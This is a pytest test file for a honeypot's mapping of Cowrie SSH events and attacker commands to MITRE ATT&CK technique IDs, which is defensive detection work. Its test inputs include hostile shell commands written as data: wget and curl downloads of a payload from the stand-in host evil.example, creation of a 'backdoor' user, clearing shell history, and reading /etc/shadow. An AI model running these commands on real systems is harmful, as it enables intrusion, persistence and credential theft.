"""
Pure unit tests for MITRE ATT&CK technique mapping - no Mongo/DB involved.

Parametrized over both parser/mitre_mapping.py and
notifier/notify_mitre_mapping.py: they're hand-duplicated copies (same
reasoning as log_setup.py/notify_log_setup.py - see CLAUDE.md), so running
every case against both modules catches the two implementations drifting
apart, mirroring the pattern test_parser.py already uses for parse_event.
"""

from __future__ import annotations

import pytest

import mitre_mapping as parser_mitre_mapping
import notify_mitre_mapping as notifier_mitre_mapping


class TestMapMitreTechniques:
    @pytest.fixture(params=[parser_mitre_mapping, notifier_mitre_mapping])
    def mod(self, request):
        return request.param

    def test_login_failed_is_brute_force(self, mod):
        assert mod.map_mitre_techniques("cowrie.login.failed") == ["T1110"]

    def test_login_success_is_brute_force_and_valid_accounts(self, mod):
        assert mod.map_mitre_techniques("cowrie.login.success") == ["T1110", "T1078"]

    def test_session_connect_is_remote_services_ssh(self, mod):
        assert mod.map_mitre_techniques("cowrie.session.connect") == ["T1021.004"]

    def test_session_closed_has_no_technique(self, mod):
        assert mod.map_mitre_techniques("cowrie.session.closed") == []

    def test_unknown_eventid_has_no_technique(self, mod):
        assert mod.map_mitre_techniques("cowrie.client.version") == []

    @pytest.mark.parametrize("command,expected", [
        ("wget http://evil.example/payload.sh", ["T1105"]),
        ("curl -O http://evil.example/payload.sh", ["T1105"]),
        ("chmod +x payload.sh", ["T1222"]),
        ("useradd -m backdoor", ["T1136"]),
        ("crontab -e", ["T1053.003"]),
        ("history -c", ["T1070.003"]),
        ("cat /etc/shadow", ["T1552.001"]),
        ("uname -a", ["T1082"]),
        ("whoami", ["T1033"]),
        ("ps aux", ["T1057"]),
        ("netstat -an", ["T1049"]),
    ])
    def test_command_input_keyword_matches(self, mod, command, expected):
        assert mod.map_mitre_techniques("cowrie.command.input", command) == expected

    def test_command_input_multiple_keywords_stack_in_order(self, mod):
        result = mod.map_mitre_techniques(
            "cowrie.command.input", "wget http://evil.example/x.sh && chmod +x x.sh"
        )
        assert result == ["T1105", "T1222"]

    def test_command_input_no_keyword_match_falls_back_to_shell_execution(self, mod):
        assert mod.map_mitre_techniques("cowrie.command.input", "ls -la /tmp") == ["T1059.004"]

    def test_command_input_empty_command_has_no_technique(self, mod):
        assert mod.map_mitre_techniques("cowrie.command.input", None) == []
        assert mod.map_mitre_techniques("cowrie.command.input", "") == []

    def test_command_matching_is_case_insensitive(self, mod):
        assert mod.map_mitre_techniques("cowrie.command.input", "WGET http://x/y") == ["T1105"]

    def test_every_returned_id_is_a_known_technique(self, mod):
        for eventid in ("cowrie.login.failed", "cowrie.login.success", "cowrie.session.connect"):
            for technique in mod.map_mitre_techniques(eventid):
                assert technique in mod.TECHNIQUES
